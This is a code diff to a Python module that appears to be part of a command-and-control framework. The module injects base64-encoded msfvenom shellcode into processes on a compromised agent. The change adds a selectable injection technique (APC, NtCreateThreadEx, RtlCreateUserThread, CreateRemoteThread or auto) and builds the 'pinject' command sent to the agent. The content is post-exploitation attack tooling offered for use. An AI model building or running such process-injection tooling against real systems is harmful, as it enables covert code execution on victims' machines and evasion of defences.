@@ -44,6 +44,11 @@ def get_info():
             "shellcode": {
                 "description": "The shellcode to inject as msfvenom base64 output",
                 "required": True
+            },
+            "technique": {
+                "description": "Injection technique to use: apc, ntcreatethread, rtlcreateuser, createremote, auto (default: auto)",
+                "required": False,
+                "default": "auto"
             }
         },
         "notes": {
@@ -59,6 +64,7 @@ def get_info():
 def execute(options, session):
     agent_id = options.get("agent_id")
     shellcode_input = options.get("shellcode")
+    technique = options.get("technique", "auto").lower()
 
     if not agent_id:
         return {
@@ -70,6 +76,14 @@ def execute(options, session):
         return {
             "success": False,
             "error": "shellcode is required"
+        }
+
+    # Validate technique parameter
+    valid_techniques = ["auto", "apc", "ntcreatethread", "rtlcreateuser", "createremote"]
+    if technique not in valid_techniques:
+        return {
+            "success": False,
+            "error": f"Invalid technique: {technique}. Valid options: {', '.join(valid_techniques)}"
         }
 
     session.current_agent = agent_id
@@ -92,7 +106,11 @@ def execute(options, session):
             "error": f"Invalid input format. CLI should send base64 encoded shellcode content, but received: {shellcode_input[:50]}..."
         }
 
-    command = f"pinject {encoded_shellcode}"
+    # Construct command with technique if not auto
+    if technique == "auto":
+        command = f"pinject {encoded_shellcode}"
+    else:
+        command = f"pinject {technique} {encoded_shellcode}"
 
     # Check if this is being executed in interactive mode
     if hasattr(session, 'is_interactive_execution') and session.is_interactive_execution:
